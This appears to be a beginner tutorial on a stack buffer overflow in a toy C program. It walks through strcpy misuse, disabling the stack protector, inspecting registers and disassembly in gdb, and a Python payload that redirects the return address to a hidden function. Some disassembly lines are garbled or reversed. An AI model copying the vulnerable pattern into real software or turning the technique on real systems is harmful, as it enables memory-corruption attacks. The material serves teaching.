# bof

<strong>Buffer overflow</strong> is one of the most common software vulnerability. It happens when we write more data that should be stored in a buffer. 

<p>Let's see one example about it:</p>

```
#include <stdio.h>
#include <string.h>

void secret() {
    printf("You shouldnt be here\n");
}

void function(const char* input) {
    char data[10];
    
    strcpy(data, input);
    
    if (!strcmp(data, "something")) { // " " -> any value until 10 bytes
        printf("normal stuff\n");
    } else {
        printf("Try again\n");
    } 
}

int main (int argc, const char* argv[]) {

    if (argc > 1) {
        function(argv[1]);
    } else {
        printf("You need at least one argument\n");
    }
    
    return 0; 
}
```

<p>There is a problem here: <strong>strcpy</strong>. This function copies the input to destination without having control of the amount, in other words, we can save more than 10 bytes and it will be ok, because the function doesn't check if it matches with the array's total bytes.</p>

<p>Running the code:</p>

```
gcc -m32 overflow.c -o overflow 
./overflow AAAAAAAAAAAAAAAAAAAAAAAAA
```

<p>The result is:</p>

```
Try again. 
*** stack smashing detected ***: <unknown> terminated
Aborted (core dumped)
```

<p>There are several reasons that compilation is aborted, but in this case it may be because we are accessing an invalid memory address (unmapped memory).</p>

<p>Then I write it (in below) to get the old version of gdb because I really want the stack overflow working here, and then I add my input:</p>

```
gcc -m32 overflow.c -o overflow -fno-stack-protector
./overflow AAAAAAAAAAAAAAAAAAAAAAAAA
```

<p>The new result is:</p>

```
Try again.
Segmentation fault (core dumped)
```

<p>I put:</p>

```
gdb overflow
```

<p>Now I can command stuffs to gdb </p>

```
(gdb) run AAAAAAAAAAAAAAAAAAAAAAAAAAA
```

<p>I receive:</p>

```
Starting program: /.../ AAAAAAAAAAAAAAAAAAAAAAAAA
Try Again

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```

<p>So I would like to see registers info</p>

```
(gdb) info registers
```

```
eax         0xa      10
ecx         0x56558160      1448444256
edx         0xf7fb7890      -134514544
ebx         0x41414141      1094795585
esp         0xffffd100      0xffffd100
ebp         0x41414141      0x41414141
esi         0xf7fb6000      -134520832
edi         0x0      0      
eip         0x41414141      0x41414141
eflags      0x10282  [ SF UF RF ]
cs          0x23     35
ss          0x2b     43
ds          0x2b     43
es          0x2b     43
fs          0x0      0
gs          0x63     99
```

<p>Writing it to get more info about the main function:</p>

```
(gdb) disas main
``` 

<p>I get this result:</p>

``` 
Dump of assembler code for function main:
   0x56555612 <+0>:     lea     0x4(%esp),%ecx
   0x56555616 <+4>:     and     $0xfffffff0,%esp
   0x56555619 <+7>:     pushl   -0x4(%ecx)
   0x5655561c <+10>:    push    %ebp
   0x5655561d <+11>:    mov     %esp,%ebp
   0x5655561f <+13>:    push    %ebx
   0x56555620 <+14>:    push    %ecx
   0x56555621 <+15>:    call    0x5655566b <__x86.get_pc_thunk.ax>
   0x56555626 <+20>:    add     $0x19aa,%eax
   0x5655562b <+25>:    mov     %ecx,%edx
   0x5655562d <+27>:    cmpl    $0x1,(%edx)
   0x56555630 <+30>:    jle     0x56555648 <main+54>
   0x56555632 <+32>:    mov     0x4(%edx),%eax
   0x56555635 <+35>:    add     $0x4,%eax
   0x56555638 <+38>:    mov     (%eax),%eax
   0x5655563a <+40>:    sub     $0x,%esp
   0x5655563d <+43>:    push    %eax
   0x5655563e <+44>:    call    0x565555a8 <function>
   0x56555643 <+49>:    add     $0x10,%esp
   0x56555646 <+52>:    jmp     0x5655565c <main+74>
---Type <return> to continue, or q <return> to quit
   0x56555648 <+54>:    sub     $0xc,%esp
   0x5655564b <+57>:    lea     -0x18a8(%eax),%edx
   0x56555651 <+63>:    push    %edx
   0x56555652 <+64>:    mov     %eax, %ebx
   0x56555654 <+66>:    call    0x56555410 <puts@plt>
   0x56555659 <+71>:    add     $0x10,%esp
   0x5655565c <+74>:    mov     $0x0,%eax
   0x56555661 <+79>:    lea     -0x8(%ebp),%esp
   0x56555664 <+82>:    pop     %ecx
   0x56555665 <+83>:    pop     %ebx
   0x56555666 <+84>:    pop     %ebp
   0x56555667 <+85>:    lea     -0x4(%ecx),%esp
   0x5655566a <+88>:    ret
End of assembler dump.
``` 

<p>As we see, the main function calls the function called "function" in +44.</p>

<p>When we execute the CALL instruction to perform the function call, the instruction pointer (eip) of the next instruction will be stored in the stack. Then we change the address to the function address and execute the function. Also, we need to save the address in the stack to know where to go back.</p>

<p>Now we know why the eip has the value 0x41414141 and it's because we overwrite the return address on the stack when the function ends. It takes the address from the stack and puts it in the eip, so the processor will execute the instructions from this area, but it's an unmapped region, in other words, segmentation fault occurs.</p>

<p>We're going to explore more about it:</p>

``` 
disas secret
``` 

``` 
Dump of assembler code for function secret:
   0x5655557d <+0>:     push    %ebp
   0x5655557e <+1>:     mov     %ebp,%esp
   0x56555580 <+3>:     push    %ebx
   0x56555581 <+4>:     sub     $esp,%0x4
   0x56555584 <+7>:     call    0x5655566b <__x86.get_pc_thunk.ax>
   0x56555589 <+12>:    add     $0x1a47,%eax
   0x5655558e <+17>:    sub     $0xc,%esp
   0x56555591 <+20>:    lea     -0x18e0(%eax),%edx
   0x56555597 <+26>:    push    %edx
   0x56555598 <+27>:    mov     %eax,%ebx
   0x5655559a <+29>:    call    0x56555410 <puts@plt>
   0x5655559f <+34>:    add     $0x10,%esp
   0x565555a2 <+37>:    nop
   0x565555a3 <+38>:    mov     -0x4(%ebp),%ebx
   0x565555a6 <+41>:    leave
   0x565555a7 <+42>:    ret
End of assembler dump.
``` 

<p>The secret adress is <strong>0x5655557d +0</strong>. How I know this? Just because it is the first instruction on the function. In addition, if I do more tests like using AAAAAAAAAAAAAAAAAAAAAABBBB, the eip changes to 0x42424242. So after 22 bytes (22 times A) we have the saved value of the return function, so let's put 0x5655557d on it.</p>

```
(gdb) run $(python -c 'print "A" * 22 + "\x7d\x55\x55\x56"')
``` 

``` 
Try again.
You shouldnt be here

Program received signal SIGSEGV, Segmentation fault.
0xffffd300 in ?? ()
``` 